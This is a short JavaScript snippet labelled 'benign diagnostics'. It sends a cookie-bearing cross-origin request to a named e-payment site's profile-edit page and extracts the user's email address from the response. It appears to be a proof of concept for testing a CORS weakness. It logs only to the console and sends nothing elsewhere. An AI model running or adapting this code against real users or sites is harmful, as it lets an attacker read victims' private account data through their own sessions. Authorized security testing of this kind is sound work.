// safe-xhr-debug.js — benign diagnostics only (no exfiltration)
(function(){
  try {
    var TARGET = "https://epay2-preprod.efinance.com.eg/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0";

    var xhr = new XMLHttpRequest();
    xhr.open("GET", TARGET, true);
    xhr.withCredentials = true; // include cookies
    // optional timeout
    xhr.timeout = 10000; // 10s

    xhr.onreadystatechange = function() {
      if (xhr.readyState !== 4) return;
      console.info("[SAFE-XHR] readyState=4, status=", xhr.status);

      // If CORS denied the response, status might be 0 or the body inaccessible.
      // Try to read responseText, but this will throw / be empty if CORS blocked.
      try {
        var txt = xhr.responseText || "";
        console.info("[SAFE-XHR] response length:", txt.length);
        console.info("[SAFE-XHR] preview:", txt.slice(0,500));

        // parse with DOMParser
        try {
          var doc = new DOMParser().parseFromString(txt, "text/html");
          var inp = doc.querySelector('input[name="email"], input[name=email]');
          var email = inp ? (inp.value || inp.getAttribute('value') || "") : null;
          console.info("[SAFE-XHR] extracted email (from fetched HTML):", email);
        } catch (pe) {
          console.warn("[SAFE-XHR] DOMParser parse error:", pe);
        }

      } catch (e) {
        console.warn("[SAFE-XHR] cannot read responseText. Probably CORS/opaque response.", e);
      }
    };

    xhr.ontimeout = function(){ console.warn("[SAFE-XHR] request timed out"); };
    xhr.onerror = function(e){ console.error("[SAFE-XHR] XHR error", e); };

    // send request
    xhr.send();
    console.info("[SAFE-XHR] request sent to", TARGET, "(withCredentials=true). Check Network tab for Cookie header)");
  } catch (err) {
    console.error("[SAFE-XHR] exception", err);
  }
})();
